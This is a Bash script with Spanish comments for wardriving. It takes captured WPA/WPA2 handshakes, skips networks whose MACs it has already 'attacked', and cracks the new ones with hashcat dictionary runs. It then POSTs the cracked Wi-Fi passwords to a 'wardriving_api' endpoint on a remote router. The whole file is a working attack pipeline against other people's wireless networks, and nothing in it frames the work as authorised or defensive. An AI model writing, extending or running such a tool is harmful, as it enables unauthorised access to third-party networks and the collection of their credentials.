#!/bin/bash
HC2200_FILE=$1
ROUTER_IP=$2
ROUTER_TOKEN=$3
DICT_DIR=$4

HASHCAT_BIN="/root/hashcat-7.1.2/hashcat.bin"
POTFILE="/root/hashcat-7.1.2/hashcat.potfile"
PENDING_SYNC="/root/pending_sync.txt"
ATTACKED_MACS="/root/attacked_macs.txt"

exec 9>/tmp/hashcat_queue.lock
flock 9

echo "[*] Iniciando procesamiento del archivo: $HC2200_FILE"

# --- SISTEMA ANTIDUPLICADOS ---
touch "$ATTACKED_MACS"
# Extraemos las MAC de los APs que vienen en este archivo
awk -F'*' '{print $4}' "$HC2200_FILE" | sort -u > "/tmp/incoming_macs.txt"

# Filtramos: Solo nos quedamos con los hashes cuyas MACs NO hemos atacado antes
grep -vFf "$ATTACKED_MACS" "$HC2200_FILE" > "/tmp/new_targets.hc2200"

if [ ! -s "/tmp/new_targets.hc2200" ]; then
    echo "[*] No hay handshakes nuevos (ya procesamos estas redes hoy). Ignorando."
    rm -f "$HC2200_FILE" "/tmp/incoming_macs.txt" "/tmp/new_targets.hc2200"
    exec 9>&-
    exit 0
fi

# Agregamos estas nuevas MACs al historial para no volver a atacarlas hoy
awk -F'*' '{print $4}' "/tmp/new_targets.hc2200" >> "$ATTACKED_MACS"
# ------------------------------

for dict in $(ls -v "$DICT_DIR"/* 2>/dev/null); do
    if [ -f "$dict" ]; then
        echo "[*] Probando diccionario: $(basename "$dict")"
        
        # Corremos Hashcat SOLO contra las redes nuevas filtradas
        $HASHCAT_BIN --potfile-path="$POTFILE" -m 22000 -a 0 -w 3 "/tmp/new_targets.hc2200" "$dict"
        STATUS=$?
        
        $HASHCAT_BIN --potfile-path="$POTFILE" -m 22000 --show "/tmp/new_targets.hc2200" > "/tmp/current_cracked.txt"
        
        if [ -s "/tmp/current_cracked.txt" ]; then
            cat "/tmp/current_cracked.txt" >> "$PENDING_SYNC"
            sort -u "$PENDING_SYNC" -o "$PENDING_SYNC" 2>/dev/null
        fi
        
        if [ -s "$PENDING_SYNC" ]; then
            TOTAL_PENDIENTES=$(wc -l < "$PENDING_SYNC")
            echo "[*] Sincronizando $TOTAL_PENDIENTES contraseñas..."
            
            HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: text/plain" \
                 --data-binary @"$PENDING_SYNC" \
                 "http://$ROUTER_IP/cgi-bin/wardriving_api?action=upload_potfile&token=$ROUTER_TOKEN" --connect-timeout 10)
            
            if [ "$HTTP_CODE" = "200" ]; then
                echo "[+] Sincronización exitosa."
                rm -f "$PENDING_SYNC"
            fi
        fi

        if [ $STATUS -eq 0 ]; then
            break 
        fi
    fi
done

echo "[*] Proceso de cracking finalizado."
rm -f "$HC2200_FILE" "/tmp/new_targets.hc2200" "/tmp/current_cracked.txt" "/tmp/incoming_macs.txt"

exec 9>&-
